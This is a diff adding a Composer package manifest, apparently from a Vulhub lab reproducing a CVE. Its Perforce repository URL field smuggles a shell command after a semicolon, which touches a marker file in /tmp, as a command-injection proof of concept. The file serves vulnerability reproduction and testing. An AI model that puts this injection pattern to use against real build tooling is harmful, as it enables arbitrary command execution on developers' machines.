@@ -1,0 +1,14 @@
+{
+  "name": "vulhub/cve-2026-40176",
+  "repositories": [
+    {
+      "type": "perforce",
+      "url": "localhost:1666; touch /tmp/cve-2026-40176-success #",
+      "depot": "depot"
+    }
+  ],
+  "require": {
+    "vulhub/nonexistent-package": "dev-main"
+  }
+}
+
